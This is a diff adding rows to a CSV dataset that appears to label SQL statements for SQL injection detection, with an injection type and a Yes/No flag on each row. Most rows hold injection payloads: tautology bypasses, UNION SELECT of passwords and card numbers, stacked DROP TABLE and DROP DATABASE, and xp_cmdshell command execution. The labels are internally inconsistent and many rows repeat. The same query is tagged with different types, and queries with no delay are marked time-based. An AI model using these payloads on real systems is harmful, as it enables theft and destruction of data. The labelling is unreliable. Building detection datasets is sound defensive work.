+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Error-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Error-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM users WHERE id = '100 OR 1=1',Error-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT * FROM products WHERE name = '2',None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Union-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Error-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Union-based,Yes
+DELETE FROM orders WHERE order_id = 1,None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Time-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM users WHERE id = '100 OR 1=1',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Error-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Union-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Time-based,Yes
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Time-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Time-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '100 OR 1=1',Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Boolean-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+DELETE FROM orders WHERE order_id = 100,None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Union-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
+SELECT * FROM users WHERE id = '100 OR 1=1',Error-based,Yes
+SELECT *FROM users WHERE username='admin' AND password='' OR '1'='1'--,Boolean-based,Yes
+"INSERT INTO accounts (username, balance) VALUES ('user1', 1000); DROP TABLE accounts;--",Time-based,Yes
+SELECT * FROM products WHERE price = 100 OR 'x'='x'--,Boolean-based,Yes
+UPDATE accounts SET password='newpass' WHERE user='admin' AND '1'='1'--,Union-based,Yes
+"SELECT id, username FROM users WHERE username = '' UNION SELECT NULL, NULL;--",Error-based,Yes
+SELECT * FROM orders WHERE order_id = ''; SELECT * FROM users--,Time-based,Yes
+SELECT * FROM customers WHERE name = ''; EXEC sp_MSForEachTable 'DROP TABLE ?';--,Union-based,Yes
+"INSERT INTO users (name, email) VALUES ('user', 'user@example.com'); SELECT * FROM admin--",Union-based,Yes
+SELECT * FROM payments WHERE card_number = '' OR 1=1--,Boolean-based,Yes
+DELETE FROM accounts WHERE user = 'john.doe' OR '1'='1'--,Boolean-based,Yes
+SELECT * FROM inventory WHERE product_id = '' AND 1=1--,Time-based,Yes
+UPDATE users SET email = 'example@example.com' WHERE user_id = ''; DROP DATABASE test;--,Time-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE users;--,Union-based,Yes
+DELETE FROM orders WHERE order_id = '' OR '1'='1'--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_date = '2024-10-06' UNION SELECT NULL;--,Error-based,Yes
+SELECT password FROM users WHERE username = '' UNION ALL SELECT password FROM admin--,Union-based,Yes
+"INSERT INTO payments (user_id, amount) VALUES ('2', 500); SELECT * FROM transactions--",Time-based,Yes
+UPDATE users SET password = 'password' WHERE username = '' OR '1'='1'--,Boolean-based,Yes
+SELECT * FROM users WHERE username = '' AND password = '' OR 'a'='a'--,Boolean-based,Yes
+"SELECT * FROM employees WHERE id = '1' UNION ALL SELECT null,null;--",Union-based,Yes
+"SELECT name, price FROM products WHERE price = '' OR '1'='1'--",Boolean-based,Yes
+UPDATE users SET status='active' WHERE user_id = 1 AND ''=''; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM orders WHERE order_id='' AND ''='';--,Boolean-based,Yes
+"SELECT * FROM products WHERE id='apple' UNION SELECT NULL, NULL;--",Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id = '1000' OR 1=1--,Boolean-based,Yes
+SELECT * FROM employees WHERE emp_id = '' UNION SELECT NULL;--,Error-based,Yes
+DELETE FROM cart WHERE product_id='' OR 'x'='x'--,Boolean-based,Yes
+"INSERT INTO logs (action, status) VALUES ('login', 'success'); DROP TABLE logs;--",Time-based,Yes
+UPDATE accounts SET password='password' WHERE username=''; EXEC xp_cmdshell('dir');--,Union-based,Yes
+SELECT * FROM inventory WHERE quantity='' AND '1'='1'--,Boolean-based,Yes
+"SELECT * FROM sales WHERE sale_id='' UNION SELECT NULL, NULL;--",Union-based,Yes
+DELETE FROM inventory WHERE product_id=' OR 1=1;--,Boolean-based,Yes
+UPDATE profiles SET bio='' WHERE id=1; DROP DATABASE users;--,Time-based,Yes
+SELECT email FROM customers WHERE email=' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM accounts WHERE balance='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM users WHERE username='admin' AND ''=''; DROP TABLE users;--,Time-based,Yes
+DELETE FROM transactions WHERE transaction_id='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM items WHERE name='' UNION ALL SELECT NULL, NULL;--",Union-based,Yes
+SELECT * FROM users WHERE username='' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM customers WHERE id=' OR ''=''; DROP TABLE customers;--,Time-based,Yes
+"INSERT INTO orders (product_id, quantity) VALUES (1, 5); DROP TABLE orders;--",Time-based,Yes
+UPDATE orders SET status='completed' WHERE order_id=' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE username = '' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id = '1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--,Union-based,Yes
+UPDATE accounts SET balance = 1000 WHERE id = ''; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM customers WHERE id = '' OR 1=1;--,Boolean-based,Yes
+DELETE FROM transactions WHERE transaction_id = '1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM employees WHERE emp_id = '1' UNION SELECT null, null;--",Union-based,Yes
+"SELECT email FROM users WHERE email = '' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM products WHERE price = 100 OR '1'='1';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET active='1' WHERE username = '' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE status = '' UNION SELECT NULL, NULL;--",Union-based,Yes
+DELETE FROM cart WHERE product_id=' OR ''='';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount = '' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id = '' OR '1'='1';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 100); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM customers WHERE id = '' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM products WHERE id = '1' AND '1'='1';--,Boolean-based,Yes
+UPDATE accounts SET status='inactive' WHERE user_id = '' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id = '1'; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id = '1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='apple' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='' UNION SELECT NULL, NULL;--",Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id = '1' UNION SELECT password FROM users;--,Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE products;--,Union-based,Yes
+UPDATE accounts SET balance=1000 WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR 1=1;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email = '' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id = '1' UNION SELECT NULL, NULL;--",Union-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--,Boolean-based,Yes
+INSERT INTO logs (entry) VALUES ('log'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET active='0' WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount = '' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id = '1' AND '1'='1';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 200); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id = '1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='active' WHERE user_id = '' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id = '1'; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id = '1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'updated bio'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='banana' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username = '' OR 'x'='x';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id = '1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE products;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, email FROM users;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE products;--,Union-based,Yes
+UPDATE accounts SET balance=1000 WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR 1=1;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT credit_card_number FROM payments;--,Union-based,Yes
+SELECT * FROM products WHERE name='' OR 1=1;--,Boolean-based,Yes
+INSERT INTO logs (entry) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET active='0' WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 500); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='active' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio update'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='orange' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE products;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE email='' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=1000 WHERE id=''; EXEC sp_msforeachtable 'DROP TABLE ?';--,Union-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR 'a'='a';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=''; DROP TABLE transactions;--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '1'='1';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR '1'='1';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE name='' OR '1'='1';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='active' WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 300); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='inactive' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio text'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='grape' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=2000 WHERE id=''; EXEC xp_cmdshell('dir');--,Union-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, password FROM users;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=''; DROP TABLE transactions;--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '1'='1';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE name='' OR '1'='1';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='active' WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 300); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='inactive' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio text'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='banana' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='admin' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 100; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=50000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR 'x'='x';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT name, credit_card FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE products;--,Union-based,Yes
+UPDATE accounts SET balance=1000 WHERE id=''; EXEC sp_dropuser 'user';--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '1'='1';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE name='' OR '1'='1';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='inactive' WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 200); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='active' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio update'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='cherry' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=2000 WHERE id=''; EXEC sp_executesql N'DROP TABLE users';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price > 100; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=60000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE address='' UNION SELECT username, password FROM users;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='0';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=''; EXEC xp_cmdshell('net user');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR 'x'='x';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+SELECT email FROM customers WHERE email='' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE name='' OR '2'='2';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('malicious log'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='active' WHERE username='' OR '1'='0';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='0';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '2'='2';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 250); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='inactive' WHERE user_id='' OR '1'='0';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '1'='0';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'malicious bio'); DROP TABLE profiles;--",Time-based,Yes
